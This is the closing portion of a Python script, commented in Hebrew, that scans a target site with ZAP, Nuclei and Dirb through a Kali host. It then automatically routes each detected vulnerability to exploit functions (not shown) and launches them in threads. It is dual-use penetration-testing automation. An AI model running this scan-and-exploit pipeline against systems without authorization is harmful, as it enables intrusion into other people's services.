    nuclei_thread = threading.Thread(target=run_remote_nuclei, args=(target_url, kali_ip, nuclei_alerts))
    nuclei_thread.start()

    # הפעלת Dirb 
    dirb_alerts = []
    dirb_thread = threading.Thread(target=run_remote_dirb, args=(target_url, kali_ip, dirb_alerts))
    dirb_thread.start()

    # הפעלת ZAP
    zap = create_zap_client(api_key)
    print(f"[*] ZAP Engine Connected. Initializing spider...")
    zap.urlopen(target_url)
    zap.ajaxSpider.scan(url=target_url)
    wait_for_ajax_spider(zap, args.poll_interval)

    print("[*] Starting Active Scan for vulnerabilities...")
    active_scan_id = zap.ascan.scan(target_url)
    wait_for_completion("Active Scan", zap.ascan.status, active_scan_id, args.poll_interval)

    zap_alerts = fetch_all_alerts(zap)
    print(f"[*] Scanners finished. ZAP found {len(zap_alerts)} alerts.")
    
    # ממתינים שגם Nuclei וגם Dirb יסיימו 
    nuclei_thread.join() 
    dirb_thread.join()
    
    # איחוד ממצאים 
    all_findings = zap_alerts.copy() 
    all_findings.extend(nuclei_alerts)
    all_findings.extend(dirb_alerts) 

    print("\n[*] [PHASE 2] Routing to Specialized Exploit Tools...")
    
    launched_tools = set()
    active_attack_threads = []
    
    # תקיפה מבוססת מודיעין (Target-Driven) מהסורקים - ללא הפעלת הגיבוי!
    for finding in all_findings:
        alert_name = finding.get('alert', '').lower()
        url = finding.get('url', '') # מחלצים את ה-URL שהסורק דיווח עליו
        
        for vulnerability_keyword, actions in EXPLOIT_ROUTER.items():
            if vulnerability_keyword in alert_name:
                funcs_to_run = actions if isinstance(actions, list) else [actions]
                
                for attack_function in funcs_to_run:
                    if attack_function.__name__ not in launched_tools:
                        print(f"[*] AI Match: Routing '{vulnerability_keyword}' to {attack_function.__name__}")
                        
                        # אנחנו מעבירים עכשיו את ה-url הספציפי שבו נמצאה הפגיעות ולא סתם את כתובת האתר הכללית
                        t = threading.Thread(target=attack_function, args=(url, kali_ip))
                        active_attack_threads.append(t)
                        t.start()
                        launched_tools.add(attack_function.__name__)

    # ממתינים לכלים המנותבים לסיים
    if active_attack_threads:
        print(f"\n[*] Executing {len(active_attack_threads)} targeted exploits in the background...")
        for t in active_attack_threads:
            t.join()
    else:
        print("\n[*] No matched vulnerabilities to exploit. Exiting Phase 2.")

    print("\n[+] All automated tasks completed.")
    
    # החזרת הפרינט המקורי לפני הדו"ח 
    builtins.print = original_print
    
    ai_report_analyzer(terminal_logs, target_url, all_findings)

  except KeyboardInterrupt:
    builtins.print = original_print
    print("\n[-] Scan interrupted by user.")
    return 130
  except Exception as exc:
    builtins.print = original_print
    print(f"[-] Scan failed: {exc}")
    return 1

  return 0


if __name__ == "__main__":
  raise SystemExit(main())
